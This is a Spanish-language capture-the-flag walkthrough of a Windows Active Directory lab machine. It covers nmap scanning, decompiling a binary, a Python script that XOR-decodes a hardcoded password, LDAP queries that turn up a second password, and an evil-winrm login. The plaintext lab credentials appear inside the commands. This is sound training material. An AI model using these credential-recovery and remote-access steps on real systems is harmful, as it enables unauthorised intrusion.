### Ping
```python
ping -c 1 10.10.11.174
PING 10.10.11.174 (10.10.11.174) 56(84) bytes of data.
64 bytes from 10.10.11.174: icmp_seq=1 ttl=127 time=150 ms

--- 10.10.11.174 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 150.365/150.365/150.365/0.000 ms
```

### TTL 127 = Windows

### nmap

```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-05 02:28:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49498/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -48s
| smb2-time: 
|   date: 2024-03-05T02:29:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.46 seconds
```

### Ports
```
| PORT    | STATE | SERVICE       | VERSION                                                |
|---------|-------|---------------|--------------------------------------------------------|
| 53/tcp  | open  | domain        | Simple DNS Plus                                        |
| 88/tcp  | open  | kerberos-sec  | Microsoft Windows Kerberos (server time: 2024-03-05...)|
| 135/tcp | open  | msrpc         | Microsoft Windows RPC                                  |
| 139/tcp | open  | netbios-ssn   | Microsoft Windows netbios-ssn                          |
| 389/tcp | open  | ldap          | Microsoft Windows Active Directory LDAP (Domain: su...)|
| 445/tcp | open  | microsoft-ds? |                                                        |
| 464/tcp | open  | kpasswd5?     |                                                        |
| 593/tcp | open  | ncacn_http    | Microsoft Windows RPC over HTTP 1.0                    |
| 636/tcp | open  | tcpwrapped    |                                                        |
| 3268/tcp| open  | ldap          | Microsoft Windows Active Directory LDAP (Domain: su...)|
| 3269/tcp| open  | tcpwrapped    |                                                        |
| 5985/tcp| open  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)               |
| 9389/tcp| open  | mc-nmf        | .NET Message Framing                                   |
|49498/tcp| open  | msrpc         | Microsoft Windows RPC                                  |
|49664/tcp| open  | msrpc         | Microsoft Windows RPC                                  |
|49667/tcp| open  | msrpc         | Microsoft Windows RPC                                  |
|49676/tcp| open  | ncacn_http    | Microsoft Windows RPC over HTTP 1.0                    |
|49679/tcp| open  | msrpc         | Microsoft Windows RPC                                  |
|49754/tcp| open  | msrpc         | Microsoft Windows RPC                                  |
```

### Enumeración de servicios compartidos

![[Pasted image 20240304224621.png]]

###### vamos a mirar el directorio support-tools
descargamos el archivo UserInfo.exe.zip
![[Pasted image 20240304225819.png]]

### unzip 

![[Pasted image 20240304230710.png]]

###### Herramienta[https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip]
usaremos esta herramienta para mirar el codigo de las funciones 

###### La cadena enc_password se decodifica en Base64 y se coloca en una matriz de bytes. Se crea una segunda matriz de bytes llamada matriz2 con el mismo valor que matriz . La contraseña parece estar cifrada mediante XOR. El proceso de descifrado es el siguiente: El código para esta función es el siguiente. Finalmente se devuelve la clave descifrada. Se inicializa un bucle, que recorre cada carácter de la matriz y lo aplica XOR con una letra de la clave y luego con el byte 0xDFu (223).
![[Pasted image 20240304233251.png]]
tenemos una password "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
###### podemos ver que hace un llamado a support.htb
![[Pasted image 20240304234651.png]]

### Script en python
```python
import base64 
from itertools 
import cycle 

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E") 
key = b"armando" 
key2 = 223 

res = '' 
for e,k in zip(enc_password, cycle(key)): 
	res += chr(e ^ k ^ key2) 
print(res)
```

![[Pasted image 20240304235604.png]]El script imprime la contraseña descifrada y podemos proceder a conectarnos al servidor LDAP para recopilar información.
ahora tenemos credenciales para intentar conectarnos al servidor LDAP

```python
	sudo apt install ldap-utils
```

### ldapsearch
con esta inyección podemos ver que hay conexión
```python
ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "Administrator"
```
![[Pasted image 20240305002408.png]]
analizamos la peticion es un trabajo arduo pero podemos encrontrar lo que parece una contraseña "Ironside47pleasure40Watchful"

### evil-winrm
```python
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

![[Pasted image 20240305003154.png]]
###### perfecto tenemos conexión. recordamos que el escaneo de nmap nos revelo que esta maquina pertenece a un dominio de Active Directory 

![[Pasted image 20240305003618.png]]
podemos ver que de hecho la maquina pertenece al dominio dc.support.htb

podemos comprobar esto con el siguiente comando
![[Pasted image 20240305003935.png]]
###### El usuario de support parece ser miembro de un grupo no predeterminado llamado Cuentas de support compartidas , así como del grupo Usuarios autenticados . Usemos BloodHound Para identificar posibles rutas de ataque en este dominio que puedan ayudarnos a escalar privilegios.


![[Pasted image 20240305005911.png]]
